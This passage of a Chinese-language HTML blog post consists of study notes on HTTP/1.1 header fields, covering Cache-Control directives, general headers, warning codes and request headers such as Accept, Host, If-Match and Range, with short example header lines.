客户端程序的信息</td></tr></tbody></table><h5 id="响应首部字段"><a href="#响应首部字段" class="headerlink" title="响应首部字段"></a>响应首部字段</h5><table><thead><tr><th>首部字段名</th><th>说明</th></tr></thead><tbody><tr><td>Accept-Ranges</td><td>是否接受字节范围请求</td></tr><tr><td>Age</td><td>推算资源创建经过时间</td></tr><tr><td>ETag</td><td>资源的匹配信息</td></tr><tr><td>Location</td><td>令客户端重定向至指定URI</td></tr><tr><td>Proxy-Authenticate</td><td>代理服务器对客户端的认证信息</td></tr><tr><td>Retry-After</td><td>对再次发起请求的时机要求</td></tr><tr><td>Server</td><td>HTTP服务器的安装信息</td></tr><tr><td>Vary</td><td>代理服务器缓存的管理信息</td></tr><tr><td>WWW-Authenticate</td><td>服务器对客户端的认证信息</td></tr></tbody></table><h5 id="实体首部字段"><a href="#实体首部字段" class="headerlink" title="实体首部字段"></a>实体首部字段</h5><table><thead><tr><th>首部字段名</th><th>说明</th></tr></thead><tbody><tr><td>Allow</td><td>资源可支持的HTTP方法</td></tr><tr><td>Content-Encoding</td><td>实体主体适用的编码方式</td></tr><tr><td>Content-Language</td><td>实体主体的自然语言</td></tr><tr><td>Content-Length</td><td>实体主体的大小（单位：字节）</td></tr><tr><td>Content-Location</td><td>替代对应资源的URI</td></tr><tr><td>Content-MD5</td><td>实体主体的报文摘要</td></tr><tr><td>Content-Range</td><td>实体主体的位置范围</td></tr><tr><td>Content-Type</td><td>实体主体的媒体类型</td></tr><tr><td>Expires</td><td>实体主体过期的日期时间</td></tr><tr><td>Last-Modified</td><td>资源的最后修改日期时间</td></tr></tbody></table><h4 id="非-HTTP-1-1-首部字段"><a href="#非-HTTP-1-1-首部字段" class="headerlink" title="非 HTTP/1.1 首部字段"></a>非 <strong>HTTP/1.1</strong> 首部字段</h4><p>RFC4229</p><p>Cookie、Set-Cookie 和 Content-Disposition 等</p><h4 id="End-to-end-首部和-Hop-by-hop-首部"><a href="#End-to-end-首部和-Hop-by-hop-首部" class="headerlink" title="End-to-end 首部和 Hop-by-hop 首部"></a><strong>End-to-end</strong> 首部和 <strong>Hop-by-hop</strong> 首部</h4><h5 id="端到端首部（End-to-end-Header）"><a href="#端到端首部（End-to-end-Header）" class="headerlink" title="端到端首部（End-to-end Header）"></a>端到端首部（<strong>End-to-end Header</strong>）</h5><p>分在此类别中的首部会转发给请求 / 响应对应的最终接收目标，且必须保存在由缓存生成的响应中，另外规定它必须被转发。</p><h5 id="逐跳首部（Hop-by-hop-Header）"><a href="#逐跳首部（Hop-by-hop-Header）" class="headerlink" title="逐跳首部（Hop-by-hop Header）"></a>逐跳首部（<strong>Hop-by-hop Header</strong>）</h5><p>分在此类别中的首部只对单次转发有效，会因通过缓存或代理而不再转发。HTTP/1.1 和之后版本中，如果要使用 hop-by-hop 首部，需提供 Connection 首部字段。</p><p>除了一下8种其他全是端到端首部</p><table><thead><tr><th>Connection</th></tr></thead><tbody><tr><td>Keep-Alive</td></tr><tr><td><strong>Proxy-Authenticate</strong></td></tr><tr><td><strong>Proxy-Authorization</strong></td></tr><tr><td><strong>Trailer</strong></td></tr><tr><td>TE</td></tr><tr><td><strong>Transfer-Encoding</strong></td></tr><tr><td><strong>Upgrade</strong></td></tr></tbody></table><h3 id="HTTP-1-1-通用首部字段"><a href="#HTTP-1-1-通用首部字段" class="headerlink" title="HTTP/1.1 通用首部字段"></a><strong>HTTP/1.1</strong> 通用首部字段</h3><p>通用首部字段是指，请求报文和响应报文双方都会使用的首部。</p><h4 id="Cache-Control"><a href="#Cache-Control" class="headerlink" title="Cache-Control"></a><strong>Cache-Control</strong></h4><p>首部字段 <strong>Cache-Control</strong> 能够控制缓存的行为</p><p>写法<code>Cache-Control: private, max-age=0, no-cache</code></p><h5 id="缓存请求指令"><a href="#缓存请求指令" class="headerlink" title="缓存请求指令"></a>缓存请求指令</h5><table><thead><tr><th>指令</th><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>no-cache</td><td>无</td><td>强制向源服务器再次验证</td></tr><tr><td>no-store</td><td>无</td><td>不缓存请求或响应的任何内容</td></tr><tr><td>max-age  = [ 秒]</td><td>必需</td><td>响应的最大Age值</td></tr><tr><td>max-stale( = [ 秒])</td><td>可省略</td><td>接收已过期的响应</td></tr><tr><td>min-fresh  = [ 秒]</td><td>必需</td><td>期望在指定时间内的响应仍有效</td></tr><tr><td>no-transform</td><td>无</td><td>代理不可更改媒体类型</td></tr><tr><td>only-if-cached</td><td>无</td><td>从缓存获取资源</td></tr><tr><td>cache-extension</td><td>-</td><td>新指令标记（token）</td></tr></tbody></table><h5 id="缓存响应指令"><a href="#缓存响应指令" class="headerlink" title="缓存响应指令"></a>缓存响应指令</h5><table><thead><tr><th>指令</th><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>public</td><td>无</td><td>可向任意方提供响应的缓存</td></tr><tr><td>private</td><td>可省略</td><td>仅向特定用户返回响应</td></tr><tr><td>no-cache</td><td>可省略</td><td>缓存前必须先确认其有效性</td></tr><tr><td>no-store</td><td>无</td><td>不缓存请求或响应的任何内容</td></tr><tr><td>no-transform</td><td>无</td><td>代理不可更改媒体类型</td></tr><tr><td>must-revalidate</td><td>无</td><td>可缓存但必须再向源服务器进行确认</td></tr><tr><td>proxy-revalidate</td><td>无</td><td>要求中间缓存服务器对缓存的响应有效性再进行确认</td></tr><tr><td>max-age = [ 秒]</td><td>必需</td><td>响应的最大Age值</td></tr><tr><td>s-maxage  = [ 秒]</td><td>必需</td><td>公共缓存服务器响应的最大Age值</td></tr><tr><td>cache-extension</td><td>-</td><td>新指令标记（token）</td></tr></tbody></table><h5 id="表示是否能缓存的指令"><a href="#表示是否能缓存的指令" class="headerlink" title="表示是否能缓存的指令"></a>表示是否能缓存的指令</h5><ul><li><p><code>Cache-Control: public</code></p><p>当指定使用 public 指令时，则明确表明其他用户也可利用缓存。</p></li><li><p><code>Cache-Control: private</code></p><p>当指定 private 指令后，响应只以特定的用户作为对象，这与 public指令的行为相反。</p><p>缓存服务器会对该特定用户提供资源缓存的服务，对于其他用户发送过来的请求，代理服务器则不会返回缓存。</p></li><li><p><code>Cache-Control: no-cache</code></p><p>使用 no-cache 指令的目的是为了防止从缓存中返回过期的资源。 </p><p>客户端发送的请求中如果包含 no-cache 指令，则表示客户端将不会接收缓存过的响应。于是，“中间”的缓存服务器必须把客户端请求转发给源服务器。中间缓存服务器不缓存，相当于隧道不对报文做文章。</p></li></ul><ul><li><p><code>Cache-Control: no-cache=Location</code></p><p>由服务器返回的响应中，若报文首部字段 Cache-Control 中对 no-cache 字段名具体指定参数值，那么客户端在接收到这个被指定参数值的首部字段对应的响应报文后，就不能使用缓存。换言之，无参数值的首部字段可以使用缓存。只能在响应指令中指定该参数。</p></li></ul><h5 id="控制可执行缓存的对象的指令"><a href="#控制可执行缓存的对象的指令" class="headerlink" title="控制可执行缓存的对象的指令"></a>控制可执行缓存的对象的指令</h5><ul><li><p><code>Cache-Control: no-store</code></p><p>当使用 no-store 指令时，暗示请求（和对应的响应）或响应中包含机密信息。</p><p>该指令规定缓存不能在本地存储请求或响应的任一部分。</p></li></ul><h5 id="指定缓存期限和认证的指令"><a href="#指定缓存期限和认证的指令" class="headerlink" title="指定缓存期限和认证的指令"></a>指定缓存期限和认证的指令</h5><ul><li><p><code>Cache-Control: s-maxage=604800（单位 ：秒）</code></p><p>s-maxage 指令的功能和 max-age 指令的相同，它们的不同点是 s- maxage 指令只适用于供多位用户使用的公共缓存服务器 。也就是说，对于向同一用户重复返回响应的服务器来说，这个指令没有任何作用。</p><p>当使用 s-maxage 指令后，则直接忽略对 Expires 首部字段及max-age 指令的处理。</p></li><li><p><code>Cache-Control: max-age=604800（单位：秒）</code></p><p>当客户端发送的请求中包含 max-age 指令时，如果判定缓存资源的缓存时间数值比指定时间的数值更小，那么客户端就接收缓存的资源。另外，当指定 max-age 值为 0，那么缓存服务器通常需要将请求转发给源服务器。</p><p>当服务器返回的响应中包含 max-age 指令时，缓存服务器将不对资源的有效性再作确认，而 max-age 数值代表资源保存为缓存的最长时间。</p><p>应用 HTTP/1.1 版本的缓存服务器遇到同时存在 Expires 首部字段的情况时，会优先处理 max-age 指令，而忽略掉 Expires 首部字段。而HTTP/1.0 版本的缓存服务器的情况却相反，max-age 指令会被忽略掉。</p></li><li><p><code>Cache-Control: min-fresh=60（单位：秒）</code></p><p>min-fresh 指令要求缓存服务器返回至少还未过指定时间的缓存资源。</p></li><li><p><code>Cache-Control: max-stale=3600（单位：秒）</code></p><p>使用 max-stale 可指示缓存资源，即使过期也照常接收。</p><p>如果指令未指定参数值，那么无论经过多久，客户端都会接收响应； 如果指令中指定了具体数值，那么即使过期，只要仍处于 max-stale 指定的时间内，仍旧会被客户端接收。</p></li><li><p><code>Cache-Control: only-if-cached</code></p><p>使用 only-if-cached 指令表示客户端仅在缓存服务器本地缓存目标资源的情况下才会要求其返回。换言之，该指令要求缓存服务器不重新加载响应，也不会再次确认资源有效性。若发生请求缓存服务器的本地缓存无响应，则返回状态码 504 Gateway Timeout。</p></li><li><p><code>Cache-Control: must-revalidate</code></p><p>使用 must-revalidate 指令，代理会向源服务器再次验证即将返回的响应缓存目前是否仍然有效。</p><p>若代理无法连通源服务器再次获取有效资源的话，缓存必须给客户端一条 504（Gateway Timeout）状态码。</p><p>另外，使用 must-revalidate 指令会忽略请求的 max-stale 指令（即使已经在首部使用了 max-stale，也不会再有效果）。</p></li><li><p><code>Cache-Control: proxy-revalidate</code></p><p>proxy-revalidate 指令要求所有的缓存服务器在接收到客户端带有该指令的请求返回响应之前，必须再次验证缓存的有效性。</p></li><li><p><code>Cache-Control: no-transform</code></p><p>使用 no-transform 指令规定无论是在请求还是响应中，缓存都不能改变实体主体的媒体类型。</p><p>这样做可防止缓存或代理压缩图片等类似操作。</p></li></ul><h5 id="Cache-Control-扩展"><a href="#Cache-Control-扩展" class="headerlink" title="Cache-Control 扩展"></a>Cache-Control 扩展</h5><p><code>Cache-Control: private, community="UCI"</code></p><p>通过 cache-extension 标记（token），可以扩展 Cache-Control 首部字段内的指令。</p><p>如上例，Cache-Control 首部字段本身没有 community 这个指令。借助extension tokens 实现了该指令的添加。如果缓存服务器不能理解community 这个新指令，就会直接忽略。因此，extension tokens 仅对能理解它的缓存服务器来说是有意义的。</p><h4 id="Connection"><a href="#Connection" class="headerlink" title="Connection"></a>Connection</h4><h5 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h5><ul><li><p>控制不再转发给代理的首部字段<code>Connection: 不再转发的首部字段名</code></p><p><img src="https://images.dadream.eu.org/images/2024/07/f6aa486e881b027e5f4c0eae92b1bf92.png"></p></li><li><p>管理持久连接</p><p>HTTP/1.1 之前的 HTTP 版本的默认连接都是非持久连接。为此，如果想在旧版本的 HTTP 协议上维持持续连接，则需要指定Connection 首部字段的值为 Keep-Alive。<code>Connection: Keep-Alive</code></p><p><img src="https://images.dadream.eu.org/images/2024/07/fa4c471298769a15944259a15361652e.png"></p><p>HTTP/1.1 版本的默认连接都是持久连接。为此，客户端会在持久连接上连续发送请求。当服务器端想明确断开连接时，则指定Connection 首部字段的值为 Close。<code>Connection: close</code></p></li></ul><h4 id="Date"><a href="#Date" class="headerlink" title="Date"></a>Date</h4><p>首部字段 Date 表明创建 HTTP 报文的日期和时间。</p><ul><li><p>HTTP/1.1 协议使用在 RFC1123 中规定的日期时间的格式</p><p><code>Date: Tue, 03 Jul 2012 04:40:59 GMT</code></p></li><li><p>之前的 HTTP 协议版本中使用在 RFC850 中定义的格式</p><p><code>Date: Tue, 03-Jul-12 04:40:59 GMT</code></p></li><li><p>C 标准库内的 asctime() 函数的输出格式</p><p><code>Date: Tue Jul 03 04:40:59 2012</code></p></li></ul><h4 id="Pragma"><a href="#Pragma" class="headerlink" title="Pragma"></a>Pragma</h4><p>Pragma 是 HTTP/1.1 之前版本的历史遗留字段，仅作为与 HTTP/1.0的向后兼容而定义。相当于HTTP/1.1之后Cache-Control</p><p><code>Pragma: no-cache</code></p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">no-cache </span></span><span class="token header"><span class="token header-name keyword">Pragma</span><span class="token punctuation">:</span> <span class="token header-value">no-cache</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>通常一起用，因为你不能掌握全部中间服务器</p><h4 id="Trailer"><a href="#Trailer" class="headerlink" title="Trailer"></a>Trailer</h4><p>首部字段 Trailer 会事先说明在报文主体后记录了哪些首部字段。该首部字段可应用在 HTTP/1.1 版本分块传输编码时。</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span><span class="token header"><span class="token header-name keyword">Date</span><span class="token punctuation">:</span> <span class="token header-value">Tue, 03 Jul 2012 04:40:56 GMT</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/html</span></span><span class="token text-html">...Transfer-Encoding: chunkedTrailer: Expires...(报文主体)... 0Expires: Tue, 28 Sep 2004 23:59:59 GMT</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上用例中，指定首部字段 Trailer 的值为 Expires，在报文主体之后（分块长度 0 之后）出现了首部字段 Expires。</p><h4 id="Transfer-Encoding"><a href="#Transfer-Encoding" class="headerlink" title="Transfer-Encoding"></a>Transfer-Encoding</h4><p>首部字段 Transfer-Encoding 规定了传输报文主体时采用的编码方式。</p><p>HTTP/1.1 的传输编码方式仅对分块传输编码有效。</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span><span class="token header"><span class="token header-name keyword">Date</span><span class="token punctuation">:</span> <span class="token header-value">Tue, 03 Jul 2012 04:40:56 GMT</span></span><span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">public, max-age=604800 </span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/javascript; charset=utf-8 </span></span><span class="token header"><span class="token header-name keyword">Expires</span><span class="token punctuation">:</span> <span class="token header-value">Tue, 10 Jul 2012 04:40:56 GMT</span></span><span class="token header"><span class="token header-name keyword">X-Frame-Options</span><span class="token punctuation">:</span> <span class="token header-value">DENY</span></span><span class="token header"><span class="token header-name keyword">X-XSS-Protection</span><span class="token punctuation">:</span> <span class="token header-value">1; mode=block </span></span><span class="token header"><span class="token header-name keyword">Content-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip </span></span><span class="token header"><span class="token header-name keyword">Transfer-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">chunked </span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">keep-alive</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Upgrade"><a href="#Upgrade" class="headerlink" title="Upgrade"></a>Upgrade</h4><p>首部字段 Upgrade 用于检测 HTTP 协议及其他协议是否可使用更高的版本进行通信，其参数值可以用来指定一个完全不同的通信协议。</p><p><img src="https://images.dadream.eu.org/images/2024/07/c345255e4e1f7c71755193f3e9157b21.png"></p><p>上图用例中，首部字段 Upgrade 指定的值为 TLS/1.0。请注意此处两个字段首部字段的对应关系，Connection 的值被指定为 Upgrade。Upgrade 首部字段产生作用的 Upgrade 对象仅限于客户端和邻接服务器之间。因此，使用首部字段 Upgrade 时，还需要额外指定Connection:Upgrade。</p><p>对于附有首部字段 Upgrade 的请求，服务器可用 101 Switching Protocols 状态码作为响应返回。</p><h4 id="Via"><a href="#Via" class="headerlink" title="Via"></a>Via</h4><p>使用首部字段 Via 是为了追踪客户端与服务器之间的请求和响应报文的传输路径。</p><p><img src="https://images.dadream.eu.org/images/2024/07/eb53ad7d905d8029eca3b989b9348508.png"></p><p>首部字段 Via 不仅用于追踪报文的转发，还可避免请求回环的发生。所以必须在经过代理时附加该首部字段内容。</p><p>1.0是指代理服务器的HTTP版本</p><h4 id="Warning"><a href="#Warning" class="headerlink" title="Warning"></a>Warning</h4><p>HTTP/1.1 的 Warning 首部是从 HTTP/1.0 的响应首部（Retry-After）演变过来的。该首部通常会告知用户一些与缓存相关的问题的警告。</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Warning</span><span class="token punctuation">:</span> <span class="token header-value">[警告码][警告的主机:端口号]“[警告内容]”([日期时间])</span></span><span class="token header"><span class="token header-name keyword">Warning</span><span class="token punctuation">:</span> <span class="token header-value">113 gw.hackr.jp:8080 "Heuristic expiration" Tue, 03</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="HTTP-1-1-警告码"><a href="#HTTP-1-1-警告码" class="headerlink" title="HTTP/1.1 警告码"></a><strong>HTTP/1.1</strong> 警告码</h5><table><thead><tr><th>警告码</th><th>警告内容</th><th>说明</th></tr></thead><tbody><tr><td>110</td><td>Response  is stale（响应已过期）</td><td>代理返回已过期的资源</td></tr><tr><td>111</td><td>Revalidation  failed（再验证失败）</td><td>代理再验证资源有效性时失败（服务器无法到达等原因）</td></tr><tr><td>112</td><td>Disconnection operation（断开连接操作）</td><td>代理与互联网连接被故意切断</td></tr><tr><td>113</td><td>Heuristic  expiration（试探性过期）</td><td>响应的使用期超过24小时（有效缓存的设定时间大于24小时的情况下）</td></tr><tr><td>199</td><td>Miscellaneous  warning（杂项警告）</td><td>任意的警告内容</td></tr><tr><td>214</td><td>Transformation  applied（使用了转换）</td><td>代理对内容编码或媒体类型等执行了某些处理时</td></tr><tr><td>299</td><td>Miscellaneous persistent  warning（持久杂项警告）</td><td>任意的警告内容</td></tr></tbody></table><h3 id="请求首部字段-1"><a href="#请求首部字段-1" class="headerlink" title="请求首部字段"></a>请求首部字段</h3><p>请求首部字段是从客户端往服务器端发送请求报文中所使用的字段， 用于补充请求的附加信息、客户端信息、对响应内容相关的优先级等内容。</p><h4 id="Accept"><a href="#Accept" class="headerlink" title="Accept"></a>Accept</h4><p><img src="https://images.dadream.eu.org/images/2024/07/28a3ddf597307b46dbfd4f5fcaa59bc6.png"></p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.1</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>文本文件</p><p>text/html, text/plain, text/css … </p><p>application/xhtml+xml, application/xml …</p></li><li><p>图片文件</p><p>image/jpeg, image/gif, image/png …</p></li><li><p>视频文件</p><p>video/mpeg, video/quicktime …</p></li><li><p>应用程序使用的二进制文件</p><p>application/octet-stream, application/zip …</p></li></ul><p>比如，如果浏览器不支持 PNG 图片的显示，那 Accept 就不指定image/png，而指定可处理的 image/gif 和 image/jpeg 等图片类型。</p><p>若想要给显示的媒体类型增加优先级，则使用 q= 来额外表示权重值1，用分（;）进行分隔。权重值 q 的范围是 0~1（可精确到小数点后 3 位），且 1 为最大值。不指定权重 q 值时，默认权重为 q=1.0。</p><h4 id="Accept-Charset"><a href="#Accept-Charset" class="headerlink" title="Accept-Charset"></a>Accept-Charset</h4><p><img src="https://images.dadream.eu.org/images/2024/07/c4e11a52cebd529f557a2167802d9ffc.png"></p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Accept-Charset</span><span class="token punctuation">:</span> <span class="token header-value">iso-8859-5, unicode-1-1;q=0.8</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Accept-Encoding"><a href="#Accept-Encoding" class="headerlink" title="Accept-Encoding"></a>Accept-Encoding</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Accept-Encoding 首部字段用来告知服务器用户代理支持的内容编码及内容编码的优先级顺序。可一次性指定多种内容编码。</p><ul><li>gzip</li><li>compress</li><li>deflate</li><li>identity</li></ul><p>也能使用权重q，使用<code>*</code>作为通配符</p><h4 id="Accept-Language"><a href="#Accept-Language" class="headerlink" title="Accept-Language"></a>Accept-Language</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-cn,zh;q=0.7,en-us,en;q=0.3</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>首部字段 Accept-Language 用来告知服务器用户代理能够处理的自然语言集（指中文或英文等），以及自然语言集的相对优先级。可一次指定多种自然语言集。</p><h4 id="Authorization"><a href="#Authorization" class="headerlink" title="Authorization"></a>Authorization</h4><p><img src="https://images.dadream.eu.org/images/2024/07/b03ee40399dfa19fd529932d4b425bf2.png"></p><p>首部字段 Authorization 是用来告知服务器，用户代理的认证信息（证书值）。通常，想要通过服务器认证的用户代理会在接收到返回的401 状态码响应后，把首部字段 Authorization 加入请求中。共用缓存在接收到含有 Authorization 首部字段的请求时的操作处理会略有差异。</p><h4 id="Expect"><a href="#Expect" class="headerlink" title="Expect"></a>Expect</h4><p><img src="https://images.dadream.eu.org/images/2024/07/505b2dc20140f2229009f7b1d50c6003.png"></p><p>客户端使用首部字段 Expect 来告知服务器，期望出现的某种特定行为。因服务器无法理解客户端的期望作出回应而发生错误时，会返回状态码 417 Expectation Failed。</p><p>客户端可以利用该首部字段，写明所期望的扩展。</p><h4 id="From"><a href="#From" class="headerlink" title="From"></a>From</h4><p><img src="https://images.dadream.eu.org/images/2024/07/7eab6c8381ea2f0dfc218ee7b8bd0917.png"></p><p>首部字段 From 用来告知服务器使用用户代理的用户的电子邮件地址。通常，其使用目的就是为了显示搜索引擎等用户代理的负责人的电子邮件联系方式。使用代理时，应尽可能包含 From 首部字段（但可能会因代理不同，将电子邮件地址记录在 User-Agent 首部字段内）。</p><h4 id="Host"><a href="#Host" class="headerlink" title="Host"></a>Host</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">www.hackr.jp</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>首部字段 Host 会告知服务器，请求的资源所处的互联网主机名和端口号。Host 首部字段在 HTTP/1.1 规范内是唯一一个必须被包含在请求内的首部字段。</p><p>虚拟主机运行在同一个 <strong>IP</strong> 上，因此使用首部字段 <strong>Host</strong> 加以区分</p><p>若服务器未设定主机名，那直接发送一个空值即可。</p><h4 id="If-XXX"><a href="#If-XXX" class="headerlink" title="If-XXX"></a>If-XXX</h4><p>形如 If-xxx 这种样式的请求首部字段，都可称为条件请求。服务器接收到附带条件的请求后，只有判断指定条件为真时，才会执行请求。</p><p><img src="https://images.dadream.eu.org/images/2024/07/882524fadb21c8271d082b988d4bc4fe.png"></p><h4 id="If-Match"><a href="#If-Match" class="headerlink" title="If-Match"></a>If-Match</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">If-Match</span><span class="token punctuation">:</span> <span class="token header-value">"123456"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>首部字段 If-Match，属附带条件之一，它会告知服务器匹配资源所用的实体标记（ETag）值。</p><p>服务器会比对 If-Match 的字段值和资源的 ETag 值，仅当两者一致时，才会执行请求。反之，则返回状态码 412 Precondition Failed 的响应。</p><p>通配符<code>*</code>跳过匹配</p><h4 id="If-Modified-Since"><a href="#If-Modified-Since" class="headerlink" title="If-Modified-Since"></a>If-Modified-Since</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">If-Modified-Since</span><span class="token punctuation">:</span> <span class="token header-value">Thu, 15 Apr 2004 00:00:00 GMT</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>首部字段 If-Modified-Since，属附带条件之一，它会告知服务器若 If- Modified-Since 字段值早于资源的更新时间，则希望能处理该请求。而在指定 If-Modified-Since 字段值的日期时间之后，如果请求的资源都没有过更新，则返回状态码 304 Not Modified 的响应。</p><p>If-Modified-Since 用于确认代理或客户端拥有的本地资源的有效性。获取资源的更新日期时间，可通过确认首部字段 Last-Modified 来确定。</p><h4 id="If-None-Match"><a href="#If-None-Match" class="headerlink" title="If-None-Match"></a>If-None-Match</h4><p><img src="https://images.dadream.eu.org/images/2024/07/7443e192d3075d7a42155c0632ce4c06.png"></p><p>它和首部字段 If-Match 作用相反。</p><p>在 GET 或 HEAD 方法中使用首部字段 If-None-Match 可获取最新的资源。因此，这与使用首部字段 If-Modified-Since 时有些类似。</p><h4 id="If-Range"><a href="#If-Range" class="headerlink" title="If-Range"></a>If-Range</h4><p>首部字段 If-Range 属于附带条件之一。它告知服务器若指定的 If- Range 字段值（ETag 值或者时间）和请求资源的 ETag 值或时间相一致时，则作为范围请求处理。反之，则返回全体资源。</p><p><img src="https://images.dadream.eu.org/images/2024/07/9e0a6505cd35db6f7beb949d933106cc.png"></p><p><img src="https://images.dadream.eu.org/images/2024/07/d82cef8fcce80a19ce1cbcbc522d76b8.png"></p><h4 id="If-Unmodified-Since"><a href="#If-Unmodified-Since" class="headerlink" title="If-Unmodified-Since"></a>If-Unmodified-Since</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">If-Unmodified-Since</span><span class="token punctuation">:</span> <span class="token header-value">Thu, 03 Jul 2012 00:00:00 GMT</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>首部字段 If-Unmodified-Since 和首部字段 If-Modified-Since 的作用相反。它的作用的是告知服务器，指定的请求资源只有在字段值内指定的日期时间之后，未发生更新的情况下，才能处理请求。如果在指定日期时间后发生了更新，则以状态码 412 Precondition Failed 作为响应返回。</p><h4 id="Max-Forwards"><a href="#Max-Forwards" class="headerlink" title="Max-Forwards"></a>Max-Forwards</h4><p><img src="https://images.dadream.eu.org/images/2024/07/58c2400eb309d5ef98d5a565925de4b3.png"></p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Max-Forwards</span><span class="token punctuation">:</span> <span class="token header-value">10</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>每次转发数值减 <strong>1</strong>。当数值变 <strong>0</strong> 时返回响应</p><p>通过 TRACE 方法或 OPTIONS 方法，发送包含首部字段 Max- Forwards 的请求时，该字段以十进制整数形式指定可经过的服务器最大数目。</p><h4 id="Proxy-Authorization"><a href="#Proxy-Authorization" class="headerlink" title="Proxy-Authorization"></a>Proxy-Authorization</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Proxy-Authorization</span><span class="token punctuation">:</span> <span class="token header-value">Basic dGlwOjkpNLAGfFY5</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接收到从代理服务器发来的认证质询时，客户端会发送包含首部字段Proxy-Authorization 的请求，以告知服务器认证所需要的信息。</p><h4 id="Range"><a href="#Range" class="headerlink" title="Range"></a>Range</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Range</span><span class="token punctuation">:</span> <span class="token header-value">bytes=5001-10000</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对于只需获取部分资源的范围请求，包含首部字段 Range 即可告知服务器资源的指定范围。上面的示例表示请求获取从第 5001 字节至第10000 字节的资源。</p><p>接收到附带 Range 首部字段请求的服务器，会在处理请求之后返回状态码为 206 Partial Content 的响应。无法处理该范围请求时，则会返回状态码 200 OK 的响应及全部资源。</p><h4 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://www.hackr.jp/index.htm</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>首部字段 Referer 会告知服务器请求的原始资源的 URI。</p><h4 id="TE"><a href="#TE" class="headerlink" title="TE"></a>TE</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">TE</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate;q=0.5</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>首部字段 TE 会告知服务器客户端能够处理响应的传输编码方式及相对优先级。它和首部字段 Accept-Encoding 的功能很相像，但是用于传输编码。</p><p>首部字段 TE 除指定传输编码之外，还可以指定伴随 trailer 字段的分块传输编码的方式。应用后者时，只需把 trailers 赋值给该字段值。</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">TE</span><span class="token punctuation">:</span> <span class="token header-value">trailers</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a>User-Agent</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gec</span></span><span aria-hidden="true" 